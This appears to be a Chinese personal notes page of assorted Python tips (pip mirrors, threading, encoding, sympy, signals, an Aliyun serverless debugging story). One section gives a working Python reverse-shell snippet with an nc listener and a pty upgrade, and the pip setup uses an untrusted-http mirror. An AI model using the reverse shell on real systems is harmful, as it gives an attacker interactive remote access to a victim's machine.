# 写在前面

嗯哼，Python很好玩呢...有人说Python是能运行的伪代码，就写代码的速度而言是显著优于C的，也有很多好用的类库呢，反正强烈推荐这门语言啦~

当你尝试一个包的时候，注意自己的py文件名称不能与包名重名，例如不要出现flask.py

----

# 设置pip源

在Linux服务器上安装python的包时，执行这段代码可以将pip源改为国内的豆瓣源，能显著提高包的下载速度

```bash
mkdir -p ~/.pip
echo """
[global]
index-url = http://pypi.doubanio.com/simple/
[install]
trusted-host=pypi.doubanio.com
""">~/.pip/pip.conf
```

至于Windows用户，在用户目录下创建一个pip目录，如：C:\Users\chenyuan\pip，新建文件pip.ini，内容如下：

```
[global]
index-url = http://pypi.doubanio.com/simple/
[install]
trusted-host=pypi.doubanio.com
```

# 反弹shell

首先自己的服务器上用**nc -l 端口**

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(( "IP地址" , 端口 ))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

## 获得一个tty

    python -c 'import pty; pty.spawn("/bin/sh")'

----

# 让requests使用多个IP

这里用覆盖socket.create_connection函数的方法实现，注意`import requests`一定要写在后面，否则requests自己已经载入完了socket包再去改就没有效果

```python
import socket
real_create_conn = socket.create_connection
def set_src_addr(*args):
    address, timeout = args[0], args[1]
    source_address = ( 需要使用的IP , 0)
    return real_create_conn(address, timeout, source_address)
socket.create_connection = set_src_addr
import requests
```

----

# Python多线程模板

使用threading模块进行开发

[MultiThread_Template.py](code/MultiThread_Template.py)

## http.server（BaseHTTPServer）并发性改善

> 参考资料：[利用Python中SocketServer 实现客户端与服务器间非阻塞通信](http://blog.csdn.net/cnmilan/article/details/9664823)

> 直接修改BaseHTTPServer的代码中的一个细节，将BaseHTTPServer类继承的原先只能支持单个请求的SocketServer.TCPServer改为每个连接一个线程的SocketServer.ThreadingTCPServer，使BaseHTTPServer能支持并发而不是一次只能处理单个请求

**Python3的方法：**

在Python3中BaseHTTPServer改名为http.server了，首先找到http.server所在的py文件：

    python3 -c "import http.server; print(http.server)"

修改其提示的文件，例如我这里是`/usr/lib/python3.4/http/server.py`

搜索`class HTTPServer`，如果是用vim可以用`/class HTTPServer`

修改找到的这一行，改为：

```python
class HTTPServer(socketserver.ThreadingTCPServer):
```

**Python2的方法：**

首先找到BaseHTTPServer在哪：

     python -c "import BaseHTTPServer; print(BaseHTTPServer)"

修改对应的文件，如/usr/lib/python2.7/BaseHTTPServer.py，注意不要打开他直接提示的pyc文件而是要对应的同名py文件

找到这行（vim中可以输入`/class HTTPServer`进行搜索）：

```python
class HTTPServer(SocketServer.TCPServer):
```

修改其继承的父类：

```python
class HTTPServer(SocketServer.ThreadingTCPServer):
```

----

## 无root权限安装Python

下载最新版python源码后指定prefix编译，假设用户目录为/home/chenyuan

```
apt-get install libssl-dev openssl 
curl -O https://www.python.org/ftp/python/3.5.2/Python-3.5.2.tgz
tar -xzf Python-3.5.2.tgz
cd Python-3.5.2/
./configure --prefix=/home/chenyuan/python3
make
make install >/dev/null
pushd /home/chenyuan/python3/bin
cp python3 python
cp pip3 pip
alias python3=`pwd`/python
alias pip3=`pwd`/pip
```

----

# 中文输出乱码问题

方法1：运行py前设置环境变量

```bash
export PYTHONIOENCODING=utf8
```

方法2：强制修改stdout

```
import sys
sys.stdout=open(1, 'w', encoding='utf-8', closefd=False)
```

----

# 遵循PEP8检查你的代码

[pycodestyle](https://github.com/PyCQA/pycodestyle)

安装并使用pycodestyle检查代码，忽略E501一行不能长于80个字符的限制：

```
pip install pycodestyle
pycodestyle --show-source --ignore=E501 yourcode.py
```

----

# 生成随机字符串

```
from random import Random
def random_str(randomlength=8):
    str = ''
    chars = 'AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789'
    length = len(chars) - 1
    random = Random()
    for i in range(randomlength):
        str+=chars[random.randint(0, length)]
    return str
````

----

# Python解方程

需要 `pip install sympy`

```
from sympy import *
# 解一元方程：
#   2x^2-18=0
x=Symbol('x')
print(solve(2*x**2-18,x))
# 得到[-3,3]

# 解方程组
#   y=1-x
#   3x+2y-5
x,y=symbols('x y')
print(solve([ y-1+x, 3*x+2*y-5 ], [ x , y ]))
# 得到{x: 3, y: -2}
```

----

# 大数据判断in

一定要用set，因为set的in操作是O(1)的，用list是O(n)速度太慢

----

# 解决Python.h: No such file or directory

```
apt-get install -y python-dev python3-dev
```

如果为CentOS系统：

```
yum install python-devel
```

----

# 二进制字符串转普通字符串

方法一：将字符串每8个分成一组，用int转10进制，再用chr转为ascii字符

```
s="0110001101111001"
ans=""
for i in range(0,len(s)//8):
    x = s[i*8:i*8+8]
    ans+=chr(int(x,2))
```

方法二：利用binascii，先用int转为10进制，然后转为16进制字符串，调用unhexlify执行翻译

```
import binascii
s="0110001101111001"
ans=binascii.unhexlify('%x'%int(s,2))
```

补充：相应的如果要把十进制转为二进制，可以用bin(123)[2:]

----

# 十六进制字符串转bytes字符串

```
from base64 import b16encode,b16decode
print( b16encode(b'py3.io').decode() ) #output: 7079332E696F
print( b16decode("7079332E696F".upper()) ) #output: b'py3.io', 这里使用upper转大写
```

相应的，拿到一个十进制数，转字符串：

```
key = 5287002131074331513
print( b16decode( hex(key)[2:].upper() ) )#output: b'I_4m-k3y'
```

----

# 用Python3写PAT心得

* 如果发生格式错误，检查输出的最后一行的print，加上end=""表示不要换行

* 如果数据规模大导致超时，代码中的in操作前先把list转为set，能大幅度提速

----

# 用requests进行post

需要注意加上这两个参数：

```
,allow_redirects=False,headers={"Content-Type": "application/x-www-form-urlencoded"}
```

登录请求的时候是要根据返回的headers里面Location有没有对不对来判断登录是否成功的，而requests默认会跟随301/302跳转，导致无法获取到跳转请求的headers，所以加上`allow_redirects=False`

另外就是post数据的时候必须给出正确的Content-Type，否则服务器不认这个post的

再者就是可能对方有反爬虫措施，加上Referer和User-Agent就好咯

如果需要提交的是json的数据，记得post的data的单双引号要正确，应该用json.dumps的结果去post

如果要做爬虫，欢迎使用我的[EasyLogin](https://github.com/zjuchenyuan/EasyLogin)，无需再操心这些细节，专注于核心爬虫代码

----

# 通过tkinter获取、修改剪贴板

支持py2和py3，Learned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter

```
try:
    from tkinter import Tk
except ImportError:
    from Tkinter import Tk
root = Tk()
root.withdraw() #隐藏Tk的窗口
text = "Donnerwetter"
# 清空剪贴板 clear clipboard
root.clipboard_clear()
# 写入剪贴板 write text to clipboard
root.clipboard_append(text)
# 读取剪贴板 text from clipboard
clip_text = root.clipboard_get()
print(clip_text)  # --> Donnerwetter
```

----

# 符号数与无符号数转换

## 无符号→有符号，为了加上负号：

```
import ctypes
ctypes.c_int64(17039472050328044269).value
```

上述将得到-1407272023381507347

## 有符号→无符号，为了去掉负号：

```
import ctypes
ctypes.c_uint64(-1407272023381507347).value
```

上述将得到17039472050328044269

----

# 使用signal.SIGALRM在限定时间后退出进程 (only Linux)

在设计CTF的题目的时候，有必要限制用户的连接时间，这时候简单方案就是用SIGALRM信号咯

```
def clock(timeout=5):
    import signal
    def signal_handler(signum,data):
        if signum == signal.SIGALRM:
            print("Time is up!")
            exit()
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(int(timeout))
```

----

# 捕捉用户的Ctrl+C

特殊情况下我们想屏蔽掉Ctrl+C，这时候写个自己的函数处理SIGALRM信号就好啦

```
import signal

def signal_handler(signum,data):
    if signum == signal.SIGINT:
        print("Ctrl+C is pressed!")
        #raise KeyboardInterrupt

if __name__ == '__main__':
    signal.signal(signal.SIGINT, signal_handler)
    sleep(666)
````

----

# 使用signal.SIGALRM实现定时器 (only Linux)

实现一个类似Javascript的setInterval功能

```
import signal
from time import sleep
INTERVAL=1
COUNT=0
def signal_handler(signum,data):
    global COUNT
    if signum == signal.SIGALRM:
        # 你的定时器代码写在这里 Your function here
        print("Count! {}".format(COUNT))
        COUNT+=1
        signal.alarm(int(INTERVAL)) #再设置一个clock就能循环往复咯

if __name__ == '__main__':
    signal.signal(signal.SIGALRM, signal_handler)
    signal.alarm(int(INTERVAL))
    sleep(23333)
```

----

# 使用pdb进行调试

在需要调试的文件头部加入

```
import pdb
```

需要停下来的地方加入

```
pdb.set_trace()
```

Tutorial: [https://github.com/spiside/pdb-tutorial](https://github.com/spiside/pdb-tutorial)

----

# 使用Python开发Serverless(Function as Service)后端服务

[项目地址 & 部署过程](https://github.com/zjuchenyuan/zju-jwb-to-icalendar)

如果您只是需要部署一个Example，↑↑↑(顺手求个Star)；如果您对这个代码是如何写出来的和踩坑过程感兴趣，继续看吧：

## 踩过的坑与解决过程(论阿里云是怎么把人气死的)

### 1.API网关与函数计算的对接

按照[教程](https://help.aliyun.com/document_detail/54788.html)，当时不够耐心，拿着hello world的程序（不要信教程中的2.1部分的截图）就在使用API网关，结果总是返回503

耐心下来看文档把程序改为后面的撞墙式程序就好了，人家其实说了函数计算应该返回的数据结构，不按照这个结构来就会503：

```
{
    "isBase64Encoded": True或者False,
    "statusCode": 200, #可以为302来实现跳转
    "headers": {...} #返回的response headers，但其中的Content-Type没有作用
    "body": "..." #返回的网页正文内容
}
```

### 2.修改API网关参数定义后要再次发布

无论有没有改Mock设置，只要改动了设置都需要重新发布，发布线上版本即可

### 3.不能使用Windows版本的fcli工具(fcli.exe)

这个bug简直了，整个流程如下：

按照文档说明一路部署上传都没有问题，调用函数的时候却说`Unable to import module 'index'`

然后我就在Linux服务器上`docker pull python:2.7`然后`docker run -it --rm -v /root/ical:/code` python:2.7 /bin/bash`，进入bash后`cd /code; python`，进入python后`import index`

啊哈，发现是`ImportError: No module named 'bs4'`，自己的锅，用`pip install bs4 -t .`一个个解决依赖包后，在docker容器中总算是能够跑起来了，且能正常返回了

然后用`fcli.exe shell`的`mkf`再上传一次，调用函数还是老样子`Unable to import module 'index'`，令人很抓狂。。。

突然想到不能被import应该是全局的import失败了，多次折腾后，把`from grabber import grabber`移动到index函数中，总算得到了明确的报错：还是`ImportError: No module named 'bs4'`；哈？这是什么鬼，明明我都把bs4文件夹放到代码目录下了，为啥还是报错？

既然他说import失败，会不会是Python搜索包的PATH的问题，于是Google到了把当前文件所在的目录加入搜索的方法：

```
sys.path.append(os.path.dirname(os.path.abspath(__file__)))
```

Orz, 还是没有用。。。

想到既然部署后代码文件夹`/code`没有我需要的依赖包，那`/code`文件夹里面到底有啥呢？果断fuck一下，在index函数开头写上:

```
def index():
    return {"fuck": list(os.listdir("/code"))}
    import bs4 #会出错的import
    ...#正常代码
```

总算调用成功了，然后一看输出结果，woc! (内心中骂了多次mdzz阿里云

给张截图：

![](assets/img/fuckaliyun.jpg)

os.listdir应该返回的是当前这个文件夹下含有的文件名称和文件夹名称，而现在我们看到的是含有'\\'很像路径名的东西，说明这个fcli.exe把windows的'\\'路径名当成了文件名的一部分，部署后在/code文件夹下也就对应创建了名称为"bs4\\__init__.py"这样的文件(根本没有bs4子文件夹)，Python当然会找不到bs4这个包啊！摔！

改用人家fcli的Linux 64bit版本，问题解决。。。

总结一下，万万想不到Windows版本的工具(针对0.5版本)会把路径分隔符\\当成文件名一部分来看待，真是大开眼界